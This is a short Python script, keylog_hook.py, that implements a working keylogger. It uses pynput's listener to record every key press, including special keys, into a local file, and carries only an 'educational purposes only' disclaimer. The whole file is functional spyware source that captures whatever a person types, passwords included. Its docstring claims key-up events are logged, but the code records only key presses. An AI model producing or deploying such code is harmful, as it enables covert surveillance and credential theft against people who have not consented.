"""
keylog_hook.py - Hook-based keylogger using pynput's keyboard listener.

Logs both key-down and key-up events including special keys.

For educational purposes only. Ensure compliance with local laws before use.
"""

import os

from pynput import keyboard

LOG_FILE = os.getenv("KEYLOG_FILE", "keylog.txt")

SPECIAL_KEYS: dict[keyboard.Key, str] = {
    keyboard.Key.backspace: "[BACKSPACE]",
    keyboard.Key.tab: "[TAB]",
    keyboard.Key.enter: "[ENTER]",
    keyboard.Key.shift: "[SHIFT]",
    keyboard.Key.shift_r: "[SHIFT]",
    keyboard.Key.ctrl_l: "[CTRL]",
    keyboard.Key.ctrl_r: "[CTRL]",
    keyboard.Key.alt_l: "[ALT]",
    keyboard.Key.alt_r: "[ALT]",
}


def _make_on_press(log_file):
    def on_press(key: keyboard.Key | keyboard.KeyCode) -> None:
        label = SPECIAL_KEYS.get(key)  # type: ignore[arg-type]
        if label is None:
            try:
                label = key.char  # type: ignore[union-attr]
            except AttributeError:
                label = f"[{key.name}]"  # type: ignore[union-attr]
        log_file.write(label)
        log_file.flush()

    return on_press


def main() -> None:
    with open(LOG_FILE, "a") as log_file:
        with keyboard.Listener(on_press=_make_on_press(log_file)) as listener:
            try:
                listener.join()
            except KeyboardInterrupt:
                pass


if __name__ == "__main__":
    main()
